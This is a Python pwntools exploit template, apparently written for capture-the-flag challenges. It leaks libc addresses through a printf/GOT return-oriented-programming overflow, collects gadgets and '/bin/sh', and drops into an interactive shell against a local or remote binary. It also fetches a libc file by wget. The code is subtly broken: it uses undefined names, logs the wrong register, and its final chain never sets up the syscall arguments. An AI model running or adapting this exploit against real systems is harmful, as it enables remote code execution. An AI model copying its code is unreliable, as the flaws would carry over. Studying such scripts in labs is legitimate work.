# https://docs.pwntools.com/en/stable/index.html
# https://gef.readthedocs.io/en/master/
# https://libc.blukat.me/
# https://github.com/sashs/Ropper
# https://filippo.io/linux-syscall-table/
# https://book.hacktricks.xyz/exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address

import os
import string
from pwn import *

def s2b(s):
    return bytearray(s,'latin_1')

def b2s(s):
    return s.decode('latin_1')

def init_process(local_bin=None, remote_tcp=None, remote_ssh=None, gdbscript=None, libc_ver=None):
    # Setup context
    context(terminal=['tmux', 'new-window'])
    # http://docs.pwntools.com/en/stable/context.html#pwnlib.context.ContextType.arch
    # context(os='android', arch='aarch64')
    # context(os='linux', arch='i386')
    context(os='linux', arch='amd64')
    # Extract data from binary
    elf = ELF(local_bin)
    # Find ROP gadgets
    rop = ROP(elf)
    # if libc known
    if libc_ver:
        os.system(f'[ ! -f {libc_ver}.so ] && wget https://libc.blukat.me/d/{libc_ver}.so')
        libc = ELF(f'./{libc_ver}.so')
    else:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

    if local_bin and gdbscript:
        p = process(local_bin)
    elif remote_tcp:
        url = remote_tcp.rsplit(":",1)
        host = url[0]
        port = int(url[1])
        p = remote(host,port)
    elif remote_ssh:
        # bandit0:bandit0@bandit.labs.overthewire.org:2220:~/vuln
        url = remote_ssh.split("@")
        who = url[0].split(":")
        where = url[1].split(":")
        user = who[0]
        pwd = who[1]
        host = where[0]
        port = int(where[1])
        path = where[2]
        ssh_shell = ssh(user, host, password=pwd, port=port)
        p = ssh_shell.process(path)
    else: exit(-1)
    if gdbscript:
        gdb.attach(p.pid, gdbscript)

    return p,elf,rop,libc

def get_addr(p, elf, rop, func_name='__libc_start_main'):
    # plt_puts = elf.symbols["puts"]
    plt_printf = elf.plt['printf'] 
    plt_main = elf.symbols['main']
    ptr_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]

    log.info(f"main @ {hex(plt_main)}")
    log.info(f"printf GOT @ {hex(plt_printf)}")
    log.info(f"pop rdi; ret; gadget @ {hex(g_pop_rdi)}")

    got_func = elf.got[func_name]
    log.info(f'{func_name} GOT @ {hex(got_func)}')

    rop = s2b("A"*300) + p64(ptr_rdi) + p64(got_func) + p64(plt_printf) + p64(plt_main)

    p.clean()
    p.sendline(rop)
    # parse leaked address
    # print(recieved)
    recieved = p.recvline().replace(b"We reject: kings, presidents, and voting. We believe in: rough consensus and running code.\n", b"")
    leak = u64(recieved.ljust(8, b"\x00"))
    log.info(f'leaked address: {func_name} @ {hex(leak)}')  
    return leak


def pwn():
    gdbscript = '''
    b main
    c
    '''
    # gdbscript = "c"
    p, elf, rop, libc = init_process(local_bin="./vuln", gdbscript=gdbscript)
    # p, elf, rop, libc = init_process(local_bin="./vuln",remote_tcp="docker.hackthebox.eu:30809")
    
    ptr_libc_main = get_addr(p, elf, rop)
    ptr_ptrinf = get_addr(p, elf, rop, func_name='printf')
    # identifiy libc ex: libc6_2.27-3ubuntu1_amd64 
    libc.address = ptr_ptrinf - libc.symbols['printf']
    log.info(f'libc base @ {hex(libc.address)}')

    p.clean()
    # ROPgadget --binary vuln | grep "pop rdi"
    # ropper --file ropmev2 --search "pop rdx"
    # >>> rop.call('execve', ['/bin/sh', [['/bin/sh'], ['-p'], ['-c'], ['ls']], 0])
    ptr_rax = (rop.find_gadget(['pop rax', 'ret']))[0] 
    ptr_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
    ptr_rsi = (rop.find_gadget(['pop rsi', 'pop r15','ret']))[0]
    ptr_rdx = (rop.find_gadget(['pop rdx', 'pop r13', 'ret']))[0]
    syscall = (rop.find_gadget(['syscall', 'ret']))[0]
    
    log.info("rax %s " % hex(ptr_rax)) 
    log.info("rdi %s " % hex(ptr_rdi)) 
    log.info("rsi %s " % hex(ptr_rsi))
    log.info("rdx %s " % hex(ptr_rdi))

    ptr_binsh = next(libc.search(b"/bin/sh"))
    log.info("/bin/sh %s " % hex(binsh))
    ptr_exit = libc.sym["exit"]

    rop = s2b("A"*300) + p64(syscall) + p64(ptr_exit)

    print(p.clean())
    p.sendline(rop)
    print(p.clean())
    p.interactive()

pwn()